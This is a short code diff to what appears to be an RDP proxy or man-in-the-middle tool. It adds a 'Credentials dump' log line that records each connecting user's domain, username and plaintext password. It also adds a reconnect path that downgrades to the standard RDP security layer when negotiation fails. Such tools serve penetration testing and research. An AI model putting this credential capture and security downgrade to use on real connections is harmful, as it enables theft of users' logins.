@@ -75,6 +75,7 @@ class ProxyServer(rdp.RDPServerObserver):
         if self._client is None:
             #try a connection
             domain, username, password = self._controller.getCredentials()
+            log.info("Credentials dump : connection from %s with %s\\%s [%s]"%(self._controller.getHostname(), domain, username, password))
             
             width, height = self._controller.getScreen()
             reactor.connectTCP(self._target[0], int(self._target[1]), ProxyClientFactory(self, width, height, 
@@ -223,6 +224,7 @@ class ProxyClientFactory(rdp.ClientFactory):
         self._domain = domain
         self._username = username
         self._password = password
+        self._security = "ssl"
         
     def buildObserver(self, controller, addr):
         """
@@ -238,7 +240,22 @@ class ProxyClientFactory(rdp.ClientFactory):
         controller.setDomain(self._domain)
         controller.setUsername(self._username)
         controller.setPassword(self._password)
-        return ProxyClient(controller, self._server)            
+        controller.setSecurityLevel(self._security)
+        return ProxyClient(controller, self._server)
+    
+    def clientConnectionLost(self, connector, reason):
+        """
+        @summary: Connection lost event
+        @param connector: twisted connector use for rdp connection (use reconnect to restart connection)
+        @param reason: str use to advertise reason of lost connection
+        """
+        #try reconnect with basic RDP security
+        if reason.type == error.RDPSecurityNegoFail:
+            #stop nego
+            log.info("due to security nego error back to standard RDP security layer")
+            self._security = "rdp"
+            connector.connect()
+            return            
     
 class Shadow(rdp.RDPServerObserver):
     """
